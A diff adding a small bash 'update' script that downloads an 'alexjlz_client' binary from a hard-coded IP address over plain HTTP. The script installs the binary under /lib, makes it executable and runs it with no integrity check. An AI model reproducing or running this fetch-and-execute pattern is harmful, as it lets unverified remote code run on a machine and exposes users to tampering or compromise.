@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# parameter protocal: update.sh alexjlz_client_url
+
+base_location="/lib/alexjlz/"
+tmp_file="/tmp/alexjlz_client"
+default_url="http://198.211.0.204/alexjlz_client"
+url=""
+mydownloader=`which curl`
+
+mkdir -p $base_location
+
+if [ $# -lt 1 ]
+then    
+    url=$default_url
+else
+    url=$1
+fi
+$mydownloader $url >$tmp_file 2>/dev/null
+if [ $? -eq 0 ]
+then
+    cp $tmp_file $base_location/alexjlz_client
+    chmod a+x $base_location/alexjlz_client
+    $base_location/alexjlz_client
+else
+    exit -1
+fi
+rm -rf $tmp_file
